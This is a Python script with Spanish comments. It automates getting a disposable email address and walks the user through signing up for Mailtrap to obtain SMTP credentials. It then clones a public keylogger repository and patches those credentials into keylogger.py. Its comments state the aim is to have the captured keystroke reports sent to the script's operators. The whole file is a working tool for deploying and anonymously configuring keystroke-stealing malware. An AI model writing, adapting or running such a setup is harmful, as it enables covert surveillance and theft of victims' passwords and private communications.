import requests
import os
from dotenv import load_dotenv
import random
import string
import time
import re
import webbrowser
import subprocess

# Los anteriores son los paquetes necesarios para que este script funcione correctamente.

# Carga las claves necesarias.

load_dotenv()
API_KEY = os.getenv("RAPIDAPI_KEY")
AUTH_TOKEN = os.getenv("TEMPMAIL_TOKEN")

# Encabezados para usar la API.

HEADERS = {
    "X-RapidAPI-Key": API_KEY,
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "X-RapidAPI-Host": "tempmail-so.p.rapidapi.com"
}



######################### Funcion para obtener un dominio #########################

def get_domain():
    # a la variable url se le asigna un string con la url de la pagina en este caso es domains 
    url = "https://tempmail-so.p.rapidapi.com/domains"

    # a la variable res se le asigna una indicacion que en este caso es usar el modulo requests y con get obtener
    # la url especificada en la variable anterior, y le dice que la variable headers es igual al diccionario
    # creado anteriormente
    res = requests.get(url, headers=HEADERS)

    # Aqui a la variable dominios se le asigna lo que devuelve la peticion anterior y lo guarda en un archivo json.
    dominios = res.json()["data"]

    # Este devuelve el primero de los dominios disponibles
    return dominios[0]["domain"]

# Crear un nombre aleatorio
def generar_nombre():
    return "user_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

# Crear el correo
def crear_buzon(nombre, dominio):
    url = "https://tempmail-so.p.rapidapi.com/inboxes"
    res = requests.post(url, headers=HEADERS, data={
        "name": nombre,
        "domain": dominio,
        "lifespan": 600  # El correo dura 10 minutos
    })
    return res.json()["data"]["id"]

# Leer bandeja de entrada
def leer_bandeja(inbox_id):
    url = f"https://tempmail-so.p.rapidapi.com/inboxes/{inbox_id}/mails"
    res = requests.get(url, headers=HEADERS)
    return res.json()["data"]

# Leer contenido de un correo específico
def leer_mensaje(inbox_id, mail_id):
    url = f"https://tempmail-so.p.rapidapi.com/inboxes/{inbox_id}/mails/{mail_id}"
    res = requests.get(url, headers=HEADERS)
    if res.status_code == 200:
        return res.json()["data"]
    else:
        print("❌ Error al leer mensaje:", res.status_code)
        return {}
    
# Extraer el enlace de el correo
def extraer_primer_enlace(texto):
    coincidencias = re.findall(r'https?://[^\s"\<>]+', texto)
    return coincidencias[0] if coincidencias else None

# Guarda las credenciales que usaran para modificar el archivo keylogger.
def save_credentials(USERNAME, PASSWORD, MAILTRAP_KEY=".env"):
    with open(MAILTRAP_KEY, "a") as f:
        f.write(f"USERNAME={USERNAME}\n")
        f.write(f"PASSWORD={PASSWORD}\n")
        print(f"✅ Credenciales guardadas en {MAILTRAP_KEY}")

# Descarga el repositorio del keyloger que usaremos. 
def clonar_repo(repo_url, destino="repositorio_clonado"):
    if os.path.exists(destino):
        print(f"El repositorio ya esta descargado en '{destino}'.")
        return
    try:
        subprocess.run(["git", "clone", repo_url, destino], check=True)
        print(f"✅ Repositorio clonado en: {destino}")
    except subprocess.CalledProcessError as e:
        print("❌ Error al clonar el repositorio:", e)

# Configuracion del archivo keylogger.py.
def modificar_keylogger(nuevo_usernmae, nuevo_password):
    with open("keylogger/keylogger.py", "r") as f:
        contenido = f.read()


    contenido = contenido.replace("YOUR_USERNAME", nuevo_usernmae)
    contenido = contenido.replace("YOUR_PASSWORD", nuevo_password)

    with open("keylogger/keylogger.py", "w") as f:
        f.write(contenido)

    print((f"✅ Archivo actualizado con las nuevas credenciales."))

# MAIN
def main():
    dominio = get_domain()
    nombre = generar_nombre()
    correo = f"{nombre}@{dominio}"
    print(f"📨 Tu correo temporal es: {correo}")

    register_url = "https://mailtrap.io/register/signup?ref=header"
    print("🌐 Abriendo página de registro...")
    webbrowser.open(register_url)

    inbox_id = crear_buzon(nombre, dominio)

    print("⌛ Esperando mensaje... (hasta 2 minuto)")
    for i in range(24):  # 24 x 5 segundos = 120 segundos = 2 minutos
        mensajes = leer_bandeja(inbox_id)
        if mensajes:
            print(f"✅ ¡Tienes {len(mensajes)} mensaje(s)!")
            for mensaje in mensajes:
                print("\n📧 Asunto:", mensaje["subject"])
                print("🧑‍💻 De:", mensaje["from"])

            # Obtener el ID del correo para leer su contenido completo
                mail_id = mensaje["id"]
                detalle = leer_mensaje(inbox_id, mensaje["id"])

                texto = detalle.get("textContent") or detalle.get("htmlContent") or "[Sin contenido]"
                print("📝 Vista previa real:\n", texto[:300])  # Muestra los primeros 300 caracteres
                
                # Si quieres leer todo el mensaje
                print("\n🔍 Contenido completo:\n", texto)

                # Extrae el enlace y lo abre en el navegador.
                enlace = extraer_primer_enlace(texto)

                if enlace:
                    print(f"\n🔗 Enlace encontrado: {enlace}\n")
                    print("\n🌐 Abriendo enlace de verificación en el navegador...\n")
                    webbrowser.open(enlace)
                    

                    # Espera a que el usuario confirme manualmente.
                    input(f"🛑 Cuando hayas confirmado el correo y hayas iniciado sesion en la página con:\n \nCorreo: {correo}\nContraseña: (contraseña que usaste en la pagina)\n\nPresiona 'Enter' para continuar... ")
                    input("Ahora termina el registro agregando la informacion que te pide, y cuando la pagina te pregunte que producto usaras, presionas la opcion que dice 'Email API/SMTP', y el dominio lo dejas tal como esta, Una vez echo eso Presiona 'Enter'... ")
                    input("Ahora ya en la pagina de inicio, ve a la parte izquierda donde esta el menu y presiona 'Sandbox' en 'My Project' presiona 'My Sandbox' y en la pestaña integracion estan las credenciales que necesitas, Presiona 'Enter' para continuar... ")
                        
                    # guarda las credenciales en un archivo llamado mailtrap.env
                    EMAIL_ADDRESS = input("Escribe el USERNAME de las credenciales SMTP: ").strip()
                    PASSWORD_ADDRESS = input("Escribe el PASSWORD de las credenciales de SMTP ").strip()

                    save_credentials(EMAIL_ADDRESS, PASSWORD_ADDRESS)

                    # clona el repositorio del keylogger.
                    clonar_repo("https://github.com/aydinnyunus/Keylogger.git", "keylogger")

                    # modifica las lineas de USERNAME y PASSword para que nos lleguen las notificaciones a nosotros.
                    modificar_keylogger(EMAIL_ADDRESS, PASSWORD_ADDRESS)

                    print("\nVerifica que el archivo keylogger.py se haya modificado correctamente...\n")


                else:
                    print("⚠️ No se encontró ningún enlace en el mensaje.")

            break
        else:
            print(f"⏳ Esperando... ({(i+1)*5}s)")
            time.sleep(5)
    else:
        print("😞 No llegó ningún mensaje.")

if __name__ == "__main__":
    main()